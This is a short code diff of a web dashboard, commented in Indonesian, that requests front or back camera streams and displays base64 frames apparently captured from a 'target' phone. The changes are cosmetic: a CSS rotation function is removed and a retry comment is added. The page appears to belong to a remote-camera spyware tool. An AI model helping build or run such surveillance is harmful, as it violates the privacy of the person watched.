@@ -114,7 +114,6 @@
             justify-content: center;
             background: #000;
             z-index: 1;
-            overflow: hidden;
         }
         .camera-view img {
             width: 100%;
@@ -311,20 +310,6 @@
         let isStreaming = false;
         let retryCount = 0;
 
-        // ===== ROTASI CSS =====
-        // Karena gambar dari HP target masih landscape (mereng 90°),
-        // kita rotate pakai CSS supaya tampil tegak (portrait)
-        function applyRotation() {
-            const img = cameraView.querySelector('img');
-            if (!img) return;
-
-            // Rotate 90 derajat clockwise supaya portrait
-            img.style.transform = 'rotate(90deg)';
-            img.style.width = '100%';
-            img.style.height = '100%';
-            img.style.objectFit = 'contain';
-        }
-
         function startStreaming(facing) {
             const camera = facing || currentCamera;
             const cmd = camera === 'front' ? 'START_FRONT' : 'START_BACK';
@@ -359,6 +344,7 @@
                 btnSwitch.disabled = true;
                 isStreaming = false;
 
+                // Retry kalau masih idle
                 if (retryCount < 3) {
                     retryCount++;
                     setTimeout(() => {
@@ -385,11 +371,7 @@
             const base64 = snap.val();
             if (!base64 || base64.length < 100) return;
 
-            // Update frame dengan img
             cameraView.innerHTML = '<img src="data:image/jpeg;base64,' + base64 + '" alt="Live">';
-
-            // Apply rotasi CSS
-            applyRotation();
 
             lastFrameTime = Date.now();
 
